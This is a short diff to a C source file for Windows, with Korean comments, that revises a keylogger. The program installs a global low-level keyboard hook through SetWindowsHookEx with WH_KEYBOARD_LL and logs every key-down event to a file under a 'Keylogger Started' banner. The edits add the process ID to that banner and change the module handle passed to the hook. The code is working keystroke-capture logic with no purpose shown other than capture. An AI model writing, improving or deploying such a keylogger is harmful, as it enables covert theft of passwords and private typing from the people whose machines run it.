@@ -25,7 +25,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION) {
         KBDLLHOOKSTRUCT* pKb = (KBDLLHOOKSTRUCT*)lParam;
         
-        // WM_KEYDOWN만 처리 (한 번만 기록)
+        // 키가 눌렸을 때만 (떼어질 때는 무시)
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
             LogKey(pKb->vkCode);
         }
@@ -37,12 +37,12 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 DWORD WINAPI HookThread(LPVOID param) {
     FILE* fp = fopen(LOG_FILE, "a");
     if (fp) {
-        fprintf(fp, "\n=== Keylogger Started ===\n");
+        fprintf(fp, "\n=== Keylogger Started (PID: %d, Hook Method) ===\n", GetCurrentProcessId());
         fclose(fp);
     }
 
-    // 전역 키보드 후킹
-    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
+    // 키보드 후킹 설치
+    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
     
     if (!g_hHook) {
         return 1;
